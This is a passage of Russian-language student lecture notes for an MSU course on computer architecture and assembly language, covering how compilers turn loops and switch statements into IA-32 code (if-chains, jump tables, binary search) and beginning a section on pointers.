    Таким образом, есть некоторый специально выделенный регистр-счетчик, в который
загружается число итераций, которые мы хотим выполнить. Далее мы проходим по телу
цикла, доходим до рассмотренной команды, которая каждый раз уменьшает ECX, и
итерируемся.
    Если же мы пришли к циклу, а число итераций заранее неизвестно (это некоторая
переменная величина) и оказывается, что число итераций равно нулю. В этом случае
мы вначале ноль уменьшаем на 1, получаем 32 единицы. Проверка следующего условия
говорит, что полученное число – не ноль, соответственно, начинается бесконечное число
итераций. Для этого случая есть некоторое техническое решение – специальная команда
jecxz rel8, то есть мы куда-то прыгаем, только если ECX=0. Рассмотрим следующий
пример реализации чисел Фибоначчи через цикл for:
int fib (int x) { // x >= 1
    int i;
    int p_pred = 0;
    int pred = 1;
    int res = 1;
    x - -;
    for (i = 0; i < x; i ++) {
           res = p_pred + pred ;
           p_pred = pred ;
           pred = res ;
    }
    return res ;
}
Ассемблерный код:
fib :
        push ebp
        mov ebp , esp
        push ebx

        mov          ecx , dword [ ebp + 8] ; x
        xor          edx , edx ; p_pred
        mov          ebx , 1 ; pred
        mov          eax , 1 ; res


                                             97
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     dec ecx

     jecxz . end
. loop :
     lea eax , [ edx + ebx ]
     mov edx , ebx
     mov ebx , eax
     loop . loop

. end :
      pop ebx
      pop ebp
      ret




                                    98
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 8. Оператор управления switch
Обратная задача
   Рассмотрим следующую задачу. Дан некоторый ассемблерный код, который реализует
оператор while.
f:
        ...
        mov edx , dword [ ebp +8] ; (1)
        mov eax , 0 ; (2)
        test edx , edx ; (3)
        je . L7 ; (4)
     . L10 : ;
        xor eax , edx ; (5)
        shr edx , 1 ; (6)
        jne . L10 ; (7)
     .L7: ;
        and eax , 1 ; (8)
        ...
     Требуется правильно заполнить пропуски:
int f( unsigned x) {
    int val = 0;
    while ( ________ ) {
         ____________ ;
         ____________ ;
    }
    return ________ ;
}
                                                                                    1
    Отметим, что в данном случае только одно обращение в                            2
память. Под многоточием скрывается типовой пролог. Согласно
первой строчке, 𝐸 𝐷 𝑋 | 𝑥 . Далее идет присвоение: 𝐸 𝐴𝑋 | 𝑣𝑎𝑙 . В (3)               3
и (4) строках происходит некоторое сравнение величины с нулём.                      4         x==0
                                                                           x!=0
Нарисуем граф потока управления (рис. 8.1). Реализация сравнение-
                                                                                  56
переход осуществляется парой команд (3)-(4). Если EDX нулевой,
то осуществляется переход, если нет – продолжается естественный
ход, переходим на пятую строку. В (5) и (6) строках реализуются           x!=0      7

некоторые побитовые операции. В (7) строке реализуется еще одно             x==0
ветвление (через использование флаг нуля). Таким образом, мы                       8
можем записать в виде ассемблерного листинга go-to-формы
                                                                          Рис. 8.1: Граф
                                                                          потока управления
                                            99
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




if (x ==0)
    goto end ;

loop :
      val ^=x;
      x > >=1;
      if(x)
            goto loop ;
end :
      return val &1;
   Таким образом, получаем:
while (x){
    val ^=x;
    x > >=1;
}
return ( val &1);


Оператор управления switch
   Рассмотрим следующий кусок в кода в качестве иллюстрации работы switch:
enum TargetPosition {
    TARGET_AT_BEGINNING ,
    TARGET_AT_MIDDLE ,
    TARGET_AT_END
};

switch ( targetPosition ){

case TARGET_AT_BEGINNING :
    offsetInWindow = 0;
    break ;
case TARGET_AT_MIDDLE :
    offsetInWindow = MIN ( newSize - size , newSize / 2);
    break ;
case TARGET_AT_END :
    offsetInWindow = newSize - size ;
    break ;
default :
    _error_code = IllegalData ;


                                       100
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     _error_msg = tr(" requested target position "
                     " is not a TargetPosition enum member ");
}
В данном примере есть три условия, в зависимости от которых управление расходится по
трем разным вариантам, а также ветка default, которая применяется в том случае, когда
ничего не подошло. Если изобразить это графически в виде некоторого графа, получим
следующее (рис. 8.2).




                                  Рис. 8.2: Иллюстрация к объяснению

   В блок-схеме наверху указано условие, в ней есть выражение-селектор, которое
определяет выбор пути. Дальше это выражение должно приходить к какому-то целому
числу. Если ничего не подходит, переходим в default. В конце все приходит в общую
точку. Структура такого подграфа достаточно регулярна. Такой вариант может быть
реализован следующим образом. Приведем описанное выше к цепочке if-else (см. код
ниже). Отметим, что в среднем для того, чтобы пройтись по такому коду, необходимо
провести примерно 𝑛−1
                    2 сравнений, где n – число вариантов, приведенное в switch.
enum TargetPosition {
    TARGET_AT_BEGINNING ,
    TARGET_AT_MIDDLE ,
    TARGET_AT_END
};

if ( TARGET_AT_BEGINNING == targetPosition ) {
     offsetInWindow = 0;
} else if ( TARGET_AT_MIDDLE == targetPosition ) {


                                                 101
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




    offsetInWindow = MIN ( newSize - size , newSize / 2);
} else if ( TARGET_AT_END == targetPosition ) {
    offsetInWindow = newSize - size ;
} else {
    _error_code = IllegalData ;
    _error_msg = tr(" requested target position "
                     " is not a TargetPosition "
                                                  " enum member ");
}
   На ассемблере это может быть реализовано в виде (в edx помещено значение
управляющего выражения):
; ��.. targetPosition

  cmp edx , TARGET_AT_BEGINNING
  jne . comp2
; code for case TARGET_AT_BEGINNING :
  jmp . switch_exit

. comp2 :
   cmp edx , TARGET_AT_MIDDLE
   jne . comp3
; code for case TARGET_AT_MIDDLE :
   jmp . switch_exit

. comp3 :
   cmp edx , TARGET_AT_END
   jne . default
; ������ case TARGET_AT_END :
   jmp . switch_exit

. default :
; ������ default :
. switch_exit :
По этой цепочке мы двигаемся линейно. Сначала идет проверка на равенство с некоторой
константой. Если условие не выполняется, то мы переходим на следующее сравнение.
Если условие выполняется, то естественным ходом мы переходим к той части кода,
которая реализует первую ветку. После ее выполнения мы переходим безусловным
прыжком на выход. В результате такой последовательности действий последний блок
должен быть default. Если все явные проверки не выполняются, то мы переходим к


                                        102
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




последнему блоку и, соответственно,к выходу. Все это работало только потому, что в
рассмотренном примере каждый кусок кода (каждая ветка) заканчивался оператором
break, который явно передавал управление на выход из текущего оператора. Если не
писать эти дополнительные операторы, мы получим несколько другую картину, которая
соответствует чистому оператору switch, в котором есть его заголовок и тело, внутри
которого находится некоторое количество case, среди которых, возможно, есть default
(рис. 8.3).




                                  Рис. 8.3: Иллюстрация к объяснению

   Если операторы break отсутствуют, мы находим какое-то ветвление в зависимости
от текущего значения селектора, попадаем на соответствующий кусок кода и далее
двигаемся до самого конца вправо (рис. 8.3). Таким образом, какие-то куски кода могут
покрываться разными условиями и мы можем переходить туда по разным путям. Однако
такая конструкция, в которой не получается создать один входи один выход, неудобна
для восприятия.

   В случае появления break граф приобретает вид, указанный на рис. 8.4.




                                  Рис. 8.4: Иллюстрация к объяснению




                                                 103
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Duff’s Device
   Рассмотрим конструкцию под названием Duff’s Device. Реализуем цикл, в котором
происходит копирование данных с одного буфера на другой. Само копирование
реализуется одной командой. Далее нудно проверять условия; в зависимости от того,
выполнилось ли условие, мы перепрыгиваем обратно в начало цикла (а тело цикла – всего
одна команда). Таким образом, цикл суммарно реализуется тремя командами, из которых
полезную функциональность осуществляет только одна, остальные команды – накладные
расходы на организацию цикла. Попробуем решить эту проблему путем развертывания
цикла. Рассмотрим простой случай – заранее известно, что число итераций будет кратно
некоторому числу, например, восьми. Тогда число итераций можно поделить на 8 и
проверять на границу, уменьшенную в 8 раз. Тело цикла размножаем восьмикратно,
раскопировав код:
void duffs_device ( char *to , char *from , int count ) {

     register n = ( count + 7) / 8; /* count > 0 assumed */

     switch ( count % 8) {
         case 0: do { *to = * from ++;
         case 7: *to = * from ++;
         case 6: *to = * from ++;
         case 5: *to = * from ++;
         case 4: *to = * from ++;
         case 3: *to = * from ++;
         case 2: *to = * from ++;
         case 1: *to = * from ++;
                  } while (--n > 0);
     }
}
   Таким образом, код полезной нагрузки, который должен был выполнится, образует
последовательно выполняющийся блок сильно увеличенного объёма и соотношение
полезного и служебного кодов меняется.

    Рассмотрим стратегии реализации switch. Наша основная задача – сложность
сравнений 𝑛−1
            2 (𝑂 (𝑛)), которая появилась при реализации цепочек if, была уменьшена до
𝑂 (1). Рассмотрим следующий пример:
long switch_eg
    ( long x, long y, long z)
{


                                        104
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




        long w = 1;
        switch (x) {
        case 1:
            w = y*z;
            break ;
        case 2:
            w = y/z;
        case 3:
            w += z;
            break ;
        case 5:
        case 6:
            w -= z;
            break ;
        default :
            w = 2;
        }
        return w;
}
   В данном случае для одного блока используется несколько различных меток. Есть
ситуация, когда break отсутствует и управление “проваливается“’– переходим на кусок
кода, который соотносится с case 3. Некоторые значения могут отсутствовать (например,
нет метки со значением 4). Отметим, что величины в кейсах распределены на достаточно
компактом отрезке [1, 6]. В самом языке Си нет конструкций, которые позволили бы нам
уменьшить сложность сравнений. Однако, компилятор gcc имеет некоторые расширения
стандартного языка Си. В частности, имеется возможность завести массив, который
ссылается на метки:
static void * JTab []={&& l_A , && l_B }
Таким образом, можно сформировать некоторую таблицу переходов. Тогда, если есть
возможность посчитать некоторый индекс, в этом расширении языка Си появляется
возможность сделать goto на одну из меток:
int index ;
goto JTab [ index ];
Далее мы размещаем эти метки, что-то реализуем в помеченных областях:
l_A :
        ....
l_B



                                        105
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   В ассемблере есть команда jmp, операндом которой может быть не только метка, но
и регистр или память: jmp R/m/i. Отметим, что в рассматриваемом примере переменную
w нужно инициализировать не во всех ветках, поэтому присвоение мы будем выполнять
только в тех случаях, когда оно действительно требуется. Поэтому в коде ниже
инициализация переменной w отложена на потом. Рассмотрим часть кода:
long switch_eg ( long x, long y, long z) {
    long w = 1;
    switch (x) {
        . . .
    }
    return w;
}
Для него:
switch_eg :
    push ebp                                 ;
    mov ebp , esp                            ;

     mov edx , dword [ ebp + 8]              ; edx = x
     mov eax , dword [ ebp + 12]             ; eax = y
     mov ecx , dword [ ebp + 16]             ; ecx = z

     dec edx
     cmp edx , 5                             ; ���������� (x -1) � 5
     ja . L8                                 ; ���� >u goto default
     jmp [. L4 + 4* edx ]                    ; goto * JTab [x]
Сначала идет типовой пролог. Далее появляются три переменные, которые берутся
из параметров: 𝐸 𝐷 𝑋 | 𝑥 , 𝐸 𝐴𝑋 | 𝑦 , 𝐸𝐶 𝑋 | 𝑧 . Все три регистра можно использовать сразу,
предварительно сохранять их не надо (согласно принятому соглашению вызова). Далее
переходим к switch. Чтобы куда-то перепрыгнуть, нужно где-то разместить метки.
Впоследствии мы будем использовать некоторое количество меток; их адреса можно
поместить в некоторый массив. Этот массив принято размещать в секции, которая
доступна только для чтения. Секция .rodata – одна из типовых секций, куда принято
помещать данные, доступные только на чтение. Начало этого массива будет отмечено
меткой L4. Далее мы берем те значения кейсов, которые просматривали ранее, и
соотносим их с некоторыми метками. Запишем массив значений x и их соотношения с
локальными метками:
section . rodata align =4
.L4:


                                           106
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     dd . L3 ; x = 1
     dd . L5 ; x = 2
     dd . L9 ; x = 3
     dd . L8 ; x = 4
     dd . L7 ; x = 5
     dd . L7 ; x = 6
Учтем, что значения 5 и 6 были склеены и относятся к одному и тому же блоку, поэтому
метка для них будет одинаковая. 1,2,3 относятся к разным частям кода, поэтому метки
разные. Значения 4 не было, но его можно соотнести с выходом их цикла или с default.
Далее возникает вопрос: можем ли мы вообще обращаться внутрь массива (массив имеет
определенную длину, а x – произвольный). Рассмотрим границы

                                     𝐴 ⩽𝑐 𝑥 ⩽𝑐 𝐵

   Это аналогично беззнаковому сравнению:

                                    𝑥 − 𝐴 ⩽𝑈 𝐵 − 𝐴

    Рассмотрим числовой круг, на котором мы расположим значения битовых векторов,
с которыми мы работаем. Для знаковых величин числовой круг изображен на рис. 8.5.
Здесь w – разрядность. Тогда максимальное число – 2𝑤−1 − 1, переход на отрицательные
значения начинается с −2 (𝑤−1) . Далее, прибавляя по одному разряду, будем приходить
к -1. Вместе с тем все битовые вектора можно рассматривать как беззнаковые числа
(внутренний круг на рис. 8.5). Рассмотрим некоторый сектор с границей 𝐵 − 𝐴. Учтем, что
интерпретация числовых кругов совпадает для беззнакового и знакового представления
в правой часть круга. Соответственно, если взять сектор так, как указано на рис. 8.5,
получим, что проверка попадания в данный сектор для знаковых чисел равносильна двум
проверкам – проверка на правую границу 𝐵 − 𝐴 и проверка на то, что мы не попадаем в
отрицательные числа. Однако, в случае беззнакового представления тот же набор битовых
векторов начинается от 0, соответственно, одного сравнения будет достаточно.
    Приведем сравниваемую величину к нулевой базе. Переходим от сравнения вида:

                                     1 ⩽𝑐 𝑥 ⩽𝑐 6

к сравнению вида
                                      𝑥 − 1 ⩽𝑈 5

Тогда, если x не попадает в указанный отрезок, то не существует первой ячейки (x=1) и
мы не имеем права обращаться внутрь массива. Получаем:
switch_eg :



                                         107
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU


                                                 −1 0
                                               2𝑤 − 1             𝐵−𝐴




                                              −2𝑤−1         2𝑤−1 − 1
                                         Рис. 8.5: Числовые круги

     push ebp                                           ;
     mov ebp , esp                                      ;

     mov edx , dword [ ebp + 8]                         ; edx = x
     mov eax , dword [ ebp + 12]                        ; eax = y
     mov ecx , dword [ ebp + 16]                        ; ecx = z

     dec edx
     cmp edx, 5                          ; сравниваем (𝑥 − 1) и 5
     ja .L8                              ; если >𝑢 goto default
     jmp [.L4 + 4*edx]                   ; goto *JTab[x]
   Чтобы описанное выше работало, метки должны гарантированно лежать в памяти без
каких-либо промежутков. Таким образом, имеем

   • Организация таблицы переходов:

            – Каждый элемент занимает 4 байта
            – Базовый адрес - .L4

   • Переходы

            – Прямые: jmp .L2
            – Для обозначения цели перехода используется метка .L2
            – Косвенные: jmp [.L4 + 4*edx]
            – Начало таблицы переходов .L4
            – Коэффициент масштабирования должен быть 4 (в IA-32 метка содержит 32
              бита = 4 байта)
            – Выбираем цель перехода через исполнительный адрес .𝐿4 + 𝑒𝑑𝑥 ∗ 4

                      * Только для 𝑥 : 0 ⩽ 𝑥 − 1 ⩽ 5

                                                   108
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Перейдем к следующему вопросу: как размещать тело switch? Рассмотрим начало
оператора switch:
switch (x) {
case 1: // .L3
    w = y*z;
    break ;

       . . .

case 5:
case 6: // .L7
    w -= z;
    break ;
default : // .L8
    w = 2;
}
Первая метка L3 соответствует умножению. Здесь используем двухадресное умножение
imul, результат – в EAX; после этого переходим на метку L2, которая соответствует выходу
из цикла:
.L3: ; x == 1
    imul eax , ecx ; w = y*z;
    jmp .L2 ; goto switch_end
    Продолжение оператора switch:
switch (x) {
    . . .
    case 2: // .L5
         w = y/z;
/* «проваливаемся» на точку слияния .L6 */
       case 3: // .L9
           w += z;
           break ;
       . . .
}
Здесь мы переходим к знаковому делению (L5). После этого сразу переходим на L6 – к
точке слияния. L9 – начала case 3, где требуется инициализировать значение w. Далее
доходим до точки слияния, где выполняется сложение и переходим на L2, то есть на выход.
.L5:                                   ; x == 2


                                          109
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




       cdq                                   ;
       idiv ecx                              ; w = y/z;
       jmp . L6                              ; goto merge (. L6)
.L9:                                         ; x == 3
       mov eax , 1                           ; w = 1;
.L6:                                         ; точка слияния
       add eax, ecx                          ; w += z;
       jmp .L2                               ; goto switch_end

   Окончание оператора switch:
switch (x) {
case 1: // .L3
    w = y*z;
    break ;
    . . .
case 5:
case 6: // .L7
    w -= z;
    break ;
default : // .L8
    w = 2;
}
L7 – ещё одна инициализация, далее вычитаем 𝑤− = 𝑧. Далее переходим к default одним
из двух способов: первичная проверка показывает непопадание в границы или из метки
L8.
.L7:                               ; x == 5 or x == 6
       mov eax , 1                 ; w = 1;
       sub eax , ecx               ; w -= z;
       jmp .L2                     ; goto switch_end
.L8:                               ; default
       mov eax , 2                 ; w = 2
.L2:                               ; выход из switch

   Завершение функции:
return w;
В EAX находится требуемый результат, поэтому никаких дополнительных действий не
требуется. Осталось выполнить типовой эпилог: pop ebp



                                                110
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




ret      ; возвращаемое значение уже размещено в EAX Отметим, что всё описанное
выше со сложностью О(1) только тогда, когда значения достаточно компактно
сгруппированы. Тогда можно сделать таблицу переходов. Если при этом достаточное
число case’в и между ними нет промежутков, тогда компилятор скорее всего выберет
рассмотренную выше стратегию, реализуя switch. Если case’в мало, то скорее всего он
изберет стратегию с цепочкой if’в. Подведем итог.
   • Преимущества таблицы переходов:

            – Применение таблицы переходов позволяет избежать последовательного
              перебора значений меток
                      * Фиксированное время работы
            – Позволяет учитывать «дыры» и повторяющиеся метки
            – Код располагается упорядоченно, удобно обрабатывать «пропуски»
            – Инициализация w = 1 не проводилась до тех пор пока не потребовалась

   • В качестве меток используем значения типа enum
   Иногда значения могут сильно расходиться. Например:
int f(int n, int *p) {
    int _res ;
    switch (n) {
    default :
        _res = 0;
    case 1:
        *p = _res ;
        break ;
    case 64:
        _res = 1;
        break ;
    case 63:
        _res = 2;
        *p = _res ;
    case 256:
        _res = 3;
        break ;
    case 65536:
        _res = 4;
    }
    return _res ;
}


                                               111
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




- В этом случае компилятор не будет строить таблицу переходов (таблица переходов
 получается неприемлемо большой). Для данного случая можно применить третью
 стратегию. Рассмотрим двоичное дерево поиска (рис. 8.6). Отметим, что в данном случае
 при выполнении условного перехода флаги не меняются. Поэтому, оказавшись в этом
 дереве в каком-то месте, мы можем разойтись по нему по трем направлениям. Во-первых,
 мы можем проверить на совпадение с конкретным ключом, который относится к текущей
 вершине:
cmp <selector >, val_i
Если совпало, можно сразу перепрыгнуть на ветку:
je     label_j
Далее можно еще раз попытаться выполнить условный переход на какую-то другую
метку:
jl label_ {j +1}




                                   Рис. 8.6: Двоичное дерево поиска

     Для данного примера:
...
push ebp
mov ebp , esp
mov eax , 1
mov edx , dword [ ebp +8] ; n
cmp edx , 64
je .L9
jle . L13
...


Обратная задача
     Рассмотрим следующую обратную задачу


                                                 112
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




int switchMeOnce (int x) {
    int result = 0;

      switch (x) {
      . . .
      }

      return result ;
}
    Ассемблерный код:
section . text
    . . .
    mov eax , dword [ ebp +8]
    add eax , 2
    cmp eax , 6
    ja . L2
    jmp [. L8 + 4* eax ]
    . . .

section . rodata
    .L8 dd .L3 , .L2 , .L4 , .L5 , .L6 , .L6 , .L7
    Нужно ответить на следующие вопросы:

    1. Сколько раз было использовано ключевое слово case?

    2. Какие константы использовались?

    3. Какие ветки выполнения были объединены?

    4. Что помечено .L2?

   ля решения задачи рассмотрим таблицу соответствия индексов и меток (таблица 4).
Видно, что код выполняет следующие действия:

                                   индексы   0     1     2    3    4    5     6
                                   метки     l3    l2    l4   l5   l6   l6    l7

                                      Таблица 4: Таблица индексов


                                                  𝑥 + 2 ⩽𝑈 6



                                                        113
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




В виде знаковых сравнений эти действия имеют вид:

                                                 −2 ⩽𝑐 𝑥 ⩽𝑐 4

Таким образом, для x получаем следующие значения (см. таблицу. 5).

                                  индексы   0    1    2     3    4      5      6
                                  метки     L3   L2   L4    L5   L6     L6     L7
                                  x         -2   -1   0     1    2      3      4

                                       Таблица 5: Таблица значений

   Если мы не попадаем внутрь рассматриваемого массива, то мы перепрыгиваем на
метку L2. Это означает, что в этом месте не будет прыжка на кейс с числом. Таким образом,
ответ на первый вопрос – 6. Всего элементов семь, в случае индексов 4 и 5 метка одна и
та же. С кейсами соотносятся -2, 0, 1, 2, 3, 4. Ветки выполнения 2 и 3 были объединены.
На четвертый вопрос нельзя ответить, пока мы не рассмотрим тело самого switch.


Указатели
   Рассмотрим операцию взятия адреса со стороны ассемблера. Рассмотрим случай
статической памяти:
static int * p_i ;
static char * p_c ;
   Адреса 32-разрядные, поэтому на первый указатель выделяется 4 байта. Этот
указатель показывает куда-то еще (рис. 8.7). Следующие четыре байта ссылаются на char.




                                    Рис. 8.7: Иллюстрация к объяснению

   Если мы хотим обратиться с char (то есть выполнить *p_с;), нужно составить
последовательность из двух пересылок:
mov eax , dword [ p_c ]
mov al , byte [ eax ]
   Чтобы взять адрес переменной (&p_i;), то должна быть выполнена пересылка
величины в регистр:
mov eax , p_c


                                                      114
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Рассмотрим случай автоматической локальной переменной. Пусть есть некоторая
